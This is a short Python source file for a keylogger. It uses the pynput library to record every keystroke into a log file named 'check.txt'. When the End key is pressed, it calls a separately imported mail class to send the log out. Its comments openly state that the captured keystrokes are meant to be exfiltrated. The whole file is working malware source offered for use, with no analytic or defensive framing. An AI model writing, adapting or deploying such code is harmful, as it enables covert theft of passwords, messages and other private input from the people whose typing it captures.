# pynput: This will help us read the keystrokes as the user types in stuff
# logging: This will log the key strokes into a file which we can later exfiltrate by suitable means
from pynput.keyboard import Key, Listener
import logging
from pynput import keyboard
from MailS import Mail

# Basic Log Configuration
logging.basicConfig(filename="check.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")

break_program = False


# The function defined here takes an argument indicating the key pressed by the user and logs it into the file after
# converting it into a string.
def on_press(key):
    global break_program
    if key == keyboard.Key.end:
        print('end pressed')
        ob = Mail()
        ob.send_mail()
        break_program = True
        return False
    else:
        logging.info(str(key))


# recording key strokes and pass the function we created as an argument
with Listener(on_press=on_press) as listener:
    listener.join()
